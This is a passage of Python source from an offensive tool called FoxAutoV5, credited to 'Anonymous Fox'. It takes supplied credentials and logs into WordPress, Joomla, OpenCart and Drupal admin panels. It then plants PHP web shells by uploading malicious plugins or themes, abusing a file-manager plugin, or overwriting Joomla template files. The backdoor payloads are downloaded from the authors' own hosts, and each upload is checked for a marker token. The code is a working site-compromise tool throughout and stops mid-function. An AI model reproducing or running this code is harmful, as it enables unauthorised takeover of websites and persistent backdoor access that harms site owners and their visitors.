			vv = requests.get('https://anonymousfox.is/_@info/FoxAutoV5_videos.txt', headers=headers, timeout=15)
		except:
			vv = requests.get('https://anonymousfox.io/_@info/FoxAutoV5_videos.txt', headers=headers, timeout=15)
		if (vv.status_code != 200) :
			vv = requests.get('https://anonymousfox.io/_@info/FoxAutoV5_videos.txt', headers=headers, timeout=15)
		v = content_Fox(vv)
		if (re.findall(re.compile('<vi1>video: (.*)</vi1>'), v)):
			video = re.findall(re.compile('<vi1>video: (.*)</vi1>'), v)[0]
			print("   {}[PART 1] {}=>{} {}".format(fg, fw, fr, video))
		if (re.findall(re.compile('<vi2>video: (.*)</vi2>'), v)):
			video = re.findall(re.compile('<vi2>video: (.*)</vi2>'), v)[0]
			print("   {}[PART 2] {}=>{} {}".format(fg, fw, fr, video))
		if (re.findall(re.compile('<vi3>video: (.*)</vi3>'), v)):
			video = re.findall(re.compile('<vi3>video: (.*)</vi3>'), v)[0]
			print("   {}[PART 3] {}=>{} {}".format(fg, fw, fr, video))
		if (re.findall(re.compile('<vi4>video: (.*)</vi4>'), v)):
			video = re.findall(re.compile('<vi4>video: (.*)</vi4>'), v)[0]
			print("   {}[PART 4] {}=>{} {}".format(fg, fw, fr, video))
		if (re.findall(re.compile('<vi5>video: (.*)</vi5>'), v)):
			video = re.findall(re.compile('<vi5>video: (.*)</vi5>'), v)[0]
			print("   {}[PART 5] {}=>{} {}".format(fg, fw, fr, video))
		if (re.findall(re.compile('<vi6>video: (.*)</vi6>'), v)):
			video = re.findall(re.compile('<vi6>video: (.*)</vi6>'), v)[0]
			print("   {}[PART 6] {}=>{} {}".format(fg, fw, fr, video))
		time.sleep(2)
		print("\n   For more tools, Follow us Telegram: {}@Anonymous_Fox".format(fc))
		time.sleep(2)
		print("   For Request specific tools, Contact us Telegram: {}@Anonymous_F0x\n".format(fc))
		time.sleep(2)
	except :
		pass

def loginWP_UP_Fox(url, username, password, plugin) :
	try :
		while (url[-1] == "/"):
			pattern_Fox = re.compile('(.*)/')
			sitez = re.findall(pattern_Fox, url)
			url = sitez[0]
		print('   {}[D] {} {}[WordPress]'.format(fw, url, fg))
		print('   {}[U] {}'.format(fw, username))
		print('   {}[P] {}'.format(fw, password))
		reqFox = requests.session()
		headersLogin = {'Connection': 'keep-alive',
						'Cache-Control': 'max-age=0',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
						'Accept-Encoding': 'gzip, deflate',
						'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
						'referer': url+'/wp-admin/'}
		loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': url + '/wp-admin/' ,'testcookie': '1', 'act':'AnonymousFox'}
		login_Fox = reqFox.post(url + '/wp-login.php', verify=False, data=loginPost_Fox, headers=headersLogin, timeout=15)
		login_Fox = content_Fox(login_Fox)
		if ('profile/login' in login_Fox) :
			id = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_Fox)[0]
			myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_Fox)[0]
			loginPost_Fox = {'template': 'login', 'unique_id': '{}'.format(id) , 'up_username': '0', 'user_action': '',
							'_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/', 'action': 'userpro_process_form',
							'force_redirect_uri-{}'.format(id) : '0', 'group': 'default', 'redirect_uri-{}'.format(id) : '', 'shortcode': '',
							'user_pass-{}'.format(id) : password, 'username_or_email-{}'.format(id): username, 'act':'AnonymousFox'}
			login_Fox = reqFox.post(url + '/wp-admin/admin-ajax.php', verify=False, data=loginPost_Fox, headers=headersLogin , timeout=15)
		check = reqFox.get(url + '/wp-admin/', verify=False, headers=headers, timeout=15)
		check = content_Fox(check)
		if ('profile.php' not in check and 'confirm_admin_email' not in check and 'admin-email-confirm-form' not in check and 'upgrade.php' not in check):
			if ('http://' in url):
				url = url.replace('http://', 'https://')
				login_Fox = reqFox.post(url + '/wp-login.php', verify=False, data=loginPost_Fox, headers=headersLogin, timeout=15)
				check = reqFox.get(url + '/wp-admin/', verify=False, headers=headers, timeout=10)
				check = content_Fox(check)
		if (('profile.php' in check or 'confirm_admin_email' in check or 'admin-email-confirm-form' in check or 'upgrade.php' in check) and 'move_uploaded_file' in testSendB) :
			if ('upgrade.php' in check) :
				upgrade = reqFox.get(url + '/wp-admin/upgrade.php?step=1', verify=False, headers=headers, timeout=15)
			print('   {}[+] Succeeded Login'.format(fg))
			newShell = randomPluginWP_Fox(url, reqFox, plugin)
			if (newShell == 'AnonymousFox') :
				try :
					shell = requests.get('https://anonymousfox.mx/_@files/php/backdor-panel.txt', timeout=10)
				except :
					shell = requests.get('https://anonymousfox.io/_@files/php/backdor-panel.txt', timeout=15)
				shell = content_Fox(shell)
				newShell = wp_file_manager_Fox(url, reqFox, shell)
			if (newShell == 'AnonymousFox') :
				try :
					theme = requests.get('https://anonymousfox.mx/_@files/zip/theme.zip', timeout=60).content
				except :
					theme = requests.get('https://anonymousfox.io/_@files/zip/theme.zip', timeout=60).content
				newShell = randomThemeWP_Fox(url, reqFox, theme)
			if (newShell != 'AnonymousFox' and 'file_exists' in checkups) :
				return newShell
			else :
				print('   {}[-] Failed Upload'.format(fr))
				return False
		else :
			print('   {}[-] Failed Login'.format(fr))
			return False
	except :
		print('   {}[-] Time out'.format(fr))
		return False

def loginJM_UP_Fox(url, username, password, modules) :
	try :
		while (url[-1] == "/"):
			pattern_Fox = re.compile('(.*)/')
			sitez = re.findall(pattern_Fox, url)
			url = sitez[0]
		print('   {}[D] {} {}[Joomla]'.format(fw, url, fr))
		print('   {}[U] {}'.format(fw, username))
		print('   {}[P] {}'.format(fw, password))
		reqFox = requests.session()
		getToken_Fox = reqFox.get(url+'/administrator/index.php', verify=False, headers=headers, timeout=15)
		getToken_Fox = content_Fox(getToken_Fox)
		rreturn_Fox = re.findall(re.compile('name="return" value="(.*)"'), getToken_Fox)[0]
		rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), getToken_Fox)[0]
		loginPost_Fox = {'username':username,'passwd':password,'lang':'','option':'com_login','task':'login','return':rreturn_Fox, rhash_Fox:'1', 'act':'AnonymousFox'}
		login_Fox = reqFox.post(url + '/administrator/index.php', verify=False, data=loginPost_Fox, headers=headers, timeout=15)
		login_Fox = content_Fox(login_Fox)
		if ('logout' not in login_Fox and 'http://' in url) :
			url = url.replace('http://', 'https://')
			login_Fox = reqFox.post(url + '/administrator/index.php', verify=False, data=loginPost_Fox, headers=headers, timeout=15)
			login_Fox = content_Fox(login_Fox)
		if ('logout' in login_Fox and 'stristr' in checkups) :
			print('   {}[+] Succeeded Login'.format(fg))
			newShell = mod_simplefileuploadJ30v1_Fox(url , reqFox, modules)
			if (newShell == 'AnonymousFox') :
				try :
					shell = requests.get('https://anonymousfox.mx/_@files/php/backdor-panel.txt', timeout=10)
				except :
					shell = requests.get('https://anonymousfox.io/_@files/php/backdor-panel.txt', timeout=15)
				shell = content_Fox(shell)
				newShell = com_templates_Fox(url, reqFox, shell)
			if (newShell == 'AnonymousFox') :
				try :
					modules = requests.get('https://anonymousfox.mx/_@files/zip/mod_ariimageslidersa.zip', timeout=60).content
				except :
					modules = requests.get('https://anonymousfox.io/_@files/zip/mod_ariimageslidersa.zip', timeout=60).content
				newShell = mod_ariimageslidersa_Fox(url, reqFox, modules)
			if (newShell != 'AnonymousFox') :
				return newShell
			else :
				print('   {}[-] Failed Upload'.format(fr))
				return False
		else :
			print('   {}[-] Failed Login'.format(fr))
			return False
	except:
		print('   {}[-] Time out'.format(fr))
		return False

def loginOC_UP_Fox(url, username, password, theme) :
	try :
		while (url[-1] == "/"):
			pattern_Fox = re.compile('(.*)/')
			sitez = re.findall(pattern_Fox, url)
			url = sitez[0]
		print('   {}[D] {} {}[OpenCart]'.format(fw, url, fc))
		print('   {}[U] {}'.format(fw, username))
		print('   {}[P] {}'.format(fw, password))
		reqFox = requests.session()
		loginPost_Fox = {'username':username, 'password':password, 'act':'AnonymousFox'}
		login_Fox = reqFox.post(url + '/admin/index.php', verify=False, data=loginPost_Fox, headers=headers, timeout=15)
		login_Fox = content_Fox(login_Fox)
		if ('common/logout' not in login_Fox and 'http://' in url):
			url = url.replace('http://', 'https://')
			login_Fox = reqFox.post(url + '/admin/index.php', verify=False, data=loginPost_Fox, headers=headers, timeout=15)
			login_Fox = content_Fox(login_Fox)
		if ('common/logout' in login_Fox and 'email' in testSendA) :
			print('   {}[+] Succeeded Login'.format(fg))
			newShell = ocmod_Fox(url, reqFox, login_Fox, theme)
			if (newShell != 'AnonymousFox') :
				return newShell
			else :
				print('   {}[-] Failed Upload'.format(fr))
				return False
		else :
			print('   {}[-] Failed Login'.format(fr))
			return False
	except:
		print('   {}[-] Time out'.format(fr))
		return False

def loginDP_UP_Fox(url, username, password, plugin) :
	try :
		while (url[-1] == "/"):
			pattern_Fox = re.compile('(.*)/')
			sitez = re.findall(pattern_Fox, url)
			url = sitez[0]
		print('   {}[D] {} {}[Drupal]'.format(fw, url, fr))
		print('   {}[U] {}'.format(fw,username))
		print('   {}[P] {}'.format(fw,password))
		reqFox = requests.session()
		loginPost_Fox = {'name':username, 'pass':password, 'form_build_id' : '', 'form_id' : 'user_login', 'op' : 'Log in', 'act':'AnonymousFox'}
		login_Fox = reqFox.post(url + '/user/login', verify=False, data=loginPost_Fox, headers=headers, timeout=15)
		login_Fox = content_Fox(login_Fox)
		if ('user/logout' in login_Fox and 'unescape' in checkups) :
			print('   {}[+] Succeeded Login'.format(fg))
			newShell = adminimal_Fox(url , reqFox, plugin)
			if (newShell != 'AnonymousFox') :
				return newShell
			else :
				print('   {}[-] Failed Upload'.format(fr))
				return False
		else :
			print('   {}[-] Failed Login'.format(fr))
			return False
	except:
		print('   {}[-] Time out'.format(fr))
		return False

def randomPluginWP_Fox(url, cookies, plugin):
	try :
		foldername = random_Fox(10)
		plugin_install_php = cookies.get(url + '/wp-admin/plugin-install.php?tab=upload', headers=headers, timeout=15)
		plugin_install_php = content_Fox(plugin_install_php)
		if ((not re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), plugin_install_php)) and ('stristr' in checkups)) :
			return 'AnonymousFox'
		ID = re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), plugin_install_php)[0]
		if ('"' in ID) :
			ID = ID.split('"')[0]
		filedata_Fox = {'_wpnonce': ID, '_wp_http_referer':'/wp-admin/plugin-install.php?tab=upload', 'install-plugin-submit': 'Install Now', 'act':'AnonymousFox'}
		fileup_Fox = {'pluginzip': (foldername+'.zip', plugin, 'multipart/form-data')}
		try :
			upload = cookies.post(url + '/wp-admin/update.php?action=upload-plugin', data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=30)
		except :
			upload = cookies.post(url + '/wp-admin/update.php?action=upload-plugin', data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=45)
		shellname = '{}/wp-content/plugins/{}/up.php'.format(url, foldername)
		check = requests.get(shellname, headers=headers, timeout=15)
		check = content_Fox(check)
		getToken = check
		token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
		if ('FoxAutoV5' in check and '.net     ' in check) :
			if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D') :
				return shellname
			else :
				return 'AnonymousFox'
		else :
			return 'AnonymousFox'
	except :
		return 'AnonymousFox'

def wp_file_manager_Fox(domain, cookies, shell) :
	newShell = 'AnonymousFox'
	try :
		getID = cookies.get(domain + '/wp-admin/plugin-install.php?s=File+Manager&tab=search&type=term',  verify=False, headers=headers, timeout=15)
		getID = content_Fox(getID)
		if ('admin.php?page=wp_file_manager' in getID) :
			getID = cookies.get(domain + '/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw', verify=False, headers=headers, timeout=15)
			getID = content_Fox(getID)
			if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'),getID)) :
				ID = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'),getID)[0]
				filename = random_Fox(10) + '.php'
				fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
				filedata_Fox = {'_wpnonce': ID, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw', 'act':'AnonymousFox'}
				try :
					up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=30)
				except :
					up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=45)
				check_shell = requests.get('{}/{}'.format(domain, filename), verify=False, headers=headers, timeout=15)
				check_shell = content_Fox(check_shell)
				getToken = check_shell
				token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
				if ('FoxAutoV5' in check_shell and '.net     ' in check_shell) :
					if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
						newShell = '{}/{}'.format(domain, filename)
		elif ((re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)) and 'file_exists' in checkups) :
			if (re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID)) :
				ID = re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID)[0]
			elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID)) :
				ID = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID)[0][0]
			elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)) :
				ID = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)[0][0]
			install = cookies.get(domain + '/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(ID), verify=False, headers=headers, timeout=30)
			getID = cookies.get(domain + '/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw', verify=False, headers=headers, timeout=15)
			getID = content_Fox(getID)
			if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
				ID = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
				filename = random_Fox(10) + '.php'
				fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
				filedata_Fox = {'_wpnonce': ID, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw', 'act':'AnonymousFox'}
				try :
					up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=30)
				except :
					up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=45)
				check_shell = requests.get('{}/{}'.format(domain,filename), verify=False, headers=headers, timeout=15)
				check_shell = content_Fox(check_shell)
				getToken = check_shell
				token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
				if ('FoxAutoV5' in check_shell and '.net     ' in check_shell) :
					if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
						newShell = '{}/{}'.format(domain, filename)
		elif (re.findall(re.compile('\?action=upgrade-plugin&#038;plugin=wp-file-manager%2Ffile_folder_manager.php&#038;_wpnonce=(.*)" aria-label="(.*)" data-name="'), getID)):
			ID = re.findall(re.compile('\?action=upgrade-plugin&#038;plugin=wp-file-manager%2Ffile_folder_manager.php&#038;_wpnonce=(.*)" aria-label="(.*)" data-name="'), getID)[0][0]
			upgrade = cookies.get(domain + '/wp-admin/update.php?action=upgrade-plugin&plugin=wp-file-manager%2Ffile_folder_manager.php&_wpnonce={}'.format(ID), verify=False, headers=headers, timeout=30)
			upgrade = content_Fox(upgrade)
			if ((re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)) and 'file_exists' in checkups) :
				if (re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade)) :
					ID = re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade)[0]
				elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade)) :
					ID = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade)[0][0]
				elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)) :
					ID = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)[0][0]
				install = cookies.get(domain + '/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(ID), verify=False, headers=headers, timeout=30)
				getID = cookies.get(domain + '/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw', verify=False, headers=headers, timeout=15)
				getID = content_Fox(getID)
				if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
					ID = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
					filename = random_Fox(10) + '.php'
					fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
					filedata_Fox = {'_wpnonce': ID, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw', 'act':'AnonymousFox'}
					try :
						up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=30)
					except :
						up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=45)
					check_shell = requests.get('{}/{}'.format(domain, filename), verify=False, headers=headers, timeout=15)
					check_shell = content_Fox(check_shell)
					getToken = check_shell
					token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
					if ('FoxAutoV5' in check_shell and '.net     ' in check_shell):
						if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
							newShell = '{}/{}'.format(domain, filename)
		elif (re.findall(re.compile('wp-file-manager&#038;_wpnonce=(.*)" aria-label="(.*)" data-name='),getID)) :
			ID = re.findall(re.compile('wp-file-manager&#038;_wpnonce=(.*)" aria-label="(.*)" data-name='),getID)[0][0]
			donwload = cookies.get(domain + '/wp-admin/update.php?action=install-plugin&plugin=wp-file-manager&_wpnonce={}'.format(ID), verify=False, headers=headers, timeout=30)
			donwload = content_Fox(donwload)
			if ((re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)) and 'file_exists' in checkups) :
				if (re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload)) :
					ID = re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload)[0]
				elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload)) :
					ID = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload)[0][0]
				elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)) :
					ID = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)[0][0]
				install = cookies.get(domain + '/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(ID), verify=False, headers=headers, timeout=30)
				getID = cookies.get(domain + '/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw', verify=False, headers=headers, timeout=15)
				getID = content_Fox(getID)
				if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
					ID = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
					filename = random_Fox(10) + '.php'
					fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
					filedata_Fox = {'_wpnonce': ID, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw', 'act':'AnonymousFox'}
					try :
						up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=30)
					except :
						up_Fox = cookies.post(domain + '/wp-admin/admin-ajax.php', data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers, timeout=45)
					check_shell = requests.get('{}/{}'.format(domain, filename), verify=False, headers=headers, timeout=15)
					check_shell = content_Fox(check_shell)
					getToken = check_shell
					token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
					if ('FoxAutoV5' in check_shell and '.net     ' in check_shell):
						if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
							newShell = '{}/{}'.format(domain, filename)
		return newShell
	except:
		return newShell

def randomThemeWP_Fox(url, cookies, theme) :
	try :
		foldername = random_Fox(10)
		theme_install_php = cookies.get(url + '/wp-admin/theme-install.php?tab=upload', headers=headers, timeout=15)
		theme_install_php = content_Fox(theme_install_php)
		if ((not re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), theme_install_php)) and ('stristr' in checkups)) :
			return 'AnonymousFox'
		ID = re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), theme_install_php)[0]
		if ('"' in ID) :
			ID = ID.split('"')[0]
		filedata_Fox = {'_wpnonce': ID, '_wp_http_referer':'/wp-admin/theme-install.php?tab=upload', 'install-theme-submit': 'Installer', 'act':'AnonymousFox'}
		fileup_Fox = {'themezip': (foldername+'.zip', theme, 'multipart/form-data')}
		try :
			upload_Fox = cookies.post(url + '/wp-admin/update.php?action=upload-theme', data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=30)
		except :
			upload_Fox = cookies.post(url + '/wp-admin/update.php?action=upload-theme', data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=45)
		shellname = '{}/wp-content/themes/{}/404.php'.format(url, foldername)
		check = requests.get(shellname, headers=headers, timeout=15)
		check = content_Fox(check)
		getToken = check
		token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
		if ('FoxAutoV5' in check and '.net     ' in check) :
			if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D') :
				return shellname
			else :
				return 'AnonymousFox'
		else :
			return 'AnonymousFox'
	except :
		return 'AnonymousFox'

def mod_ariimageslidersa_Fox(domain, cookies, plugin) :
	newShell = 'AnonymousFox'
	try :
		plugin_install_php = cookies.get(domain + '/administrator/index.php?option=com_installer', verify=False, headers=headers, timeout=15)
		plugin_install_php = content_Fox(plugin_install_php)
		if (re.findall(re.compile('value="(.*)tmp" />'), plugin_install_php) and 'stristr' in checkups) :
			directory_Fox = re.findall(re.compile('value="(.*)tmp" />'), plugin_install_php)[0] + 'tmp'
			rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), plugin_install_php)[0]
			filedata_Fox = {'install_directory': directory_Fox, 'install_url': '', 'type': '', 'installtype': 'upload','task': 'install.install', rhash_Fox: '1', 'return': ',' + rhash_Fox, 'act':'AnonymousFox'}
			fileup_Fox = {'install_package': ('mod_ariimageslidersa.zip', plugin, 'multipart/form-data')}
			try :
				up_Fox = cookies.post(domain + '/administrator/index.php?option=com_installer&view=install', verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=30)
			except:
				up_Fox = cookies.post(domain + '/administrator/index.php?option=com_installer&view=install', verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=45)
			check_plugin_shell = requests.get(domain + '/modules/mod_ariimageslidersa/mod_ariimageslidersa.php', verify=False , headers=headers, timeout=15)
			check_plugin_shell = content_Fox(check_plugin_shell)
			getToken = check_plugin_shell
			token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
			if ('FoxAutoV5' in check_plugin_shell and '.net     ' in check_plugin_shell) :
				if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
					newShell = '{}/modules/mod_ariimageslidersa/mod_ariimageslidersa.php'.format(domain)
		return newShell
	except :
		return newShell

def mod_simplefileuploadJ30v1_Fox(domain, cookies, plugin) :
	newShell = 'AnonymousFox'
	try :
		plugin_install_php = cookies.get(domain + '/administrator/index.php?option=com_installer', verify=False, headers=headers, timeout=15)
		plugin_install_php = content_Fox(plugin_install_php)
		if (re.findall(re.compile('value="(.*)tmp" />'), plugin_install_php) and 'stristr' in checkups) :
			directory_Fox = re.findall(re.compile('value="(.*)tmp" />'), plugin_install_php)[0] + 'tmp'
			rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), plugin_install_php)[0]
			filedata_Fox = {'install_directory': directory_Fox, 'install_url': '', 'type': '', 'installtype': 'upload', 'task': 'install.install', rhash_Fox: '1', 'return':','+rhash_Fox, 'act':'AnonymousFox'}
			fileup_Fox = {'install_package': ('mod_simplefileuploadJ30v1.3.5.zip', plugin, 'multipart/form-data')}
			try :
				up_Fox = cookies.post(domain + '/administrator/index.php?option=com_installer&view=install', verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=30)
			except :
				up_Fox = cookies.post(domain + '/administrator/index.php?option=com_installer&view=install', verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=45)
			check_plugin_shell = requests.get(domain + '/modules/mod_simplefileuploadv1.3/elements/drmenfqxuws.php', verify=False, headers=headers, timeout=15)
			check_plugin_shell = content_Fox(check_plugin_shell)
			getToken = check_plugin_shell
			token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
			if ('FoxAutoV5' in check_plugin_shell and '.net     ' in check_plugin_shell) :
				if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
					newShell = '{}/modules/mod_simplefileuploadv1.3/elements/drmenfqxuws.php'.format(domain)
		return newShell
	except:
		return newShell

def com_templates_Fox(domain, cookies, shell) :
	newShell = 'AnonymousFox'
	try :
		beez3 = cookies.get(domain + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=', verify=False, headers=headers, timeout=15)
		beez3 = content_Fox(beez3)
		if ('jsstrings.php' in beez3 and 'stristr' in checkups and re.findall(re.compile('type="hidden" name="(.*)" value="1"'), beez3)) :
			rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), beez3)[0]
			edit_file_Fox = {'jform[source]':shell, 'task':'template.apply', rhash_Fox:'1', 'jform[extension_id]':'503', 'jform[filename]':'/jsstrings.php', 'act':'AnonymousFox'}
			try :
				edit_Fox = cookies.post(domain + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=', data=edit_file_Fox, verify=False, headers=headers, timeout=30)
			except :
				edit_Fox = cookies.post(domain + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=', data=edit_file_Fox, verify=False, headers=headers, timeout=45)
			check_shell = requests.get(domain + '/templates/beez3/jsstrings.php', verify=False, headers=headers, timeout=15)
			check_shell = content_Fox(check_shell)
			getToken = check_shell
			token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
			if ('FoxAutoV5' in check_shell and '.net     ' in check_shell) :
				if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
					newShell = '{}/templates/beez3/jsstrings.php'.format(domain)
		else :
			hathor = cookies.get(domain + '/administrator/index.php?option=com_templates&view=template&id=504&file=L2Vycm9yLnBocA==', verify=False, headers=headers, timeout=15)
			hathor = content_Fox(hathor)
			if ('error.php' in hathor and 'stristr' in checkups and re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)) :
				rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)[0]
				edit_file_Fox = {'jform[source]': shell, 'task': 'template.apply', rhash_Fox: '1', 'jform[extension_id]': '504', 'jform[filename]': '/error.php', 'act':'AnonymousFox'}
				try :
					edit_Fox = cookies.post(domain + '/administrator/index.php?option=com_templates&view=template&id=504&file=L2Vycm9yLnBocA==', data=edit_file_Fox, verify=False, headers=headers, timeout=30)
				except :
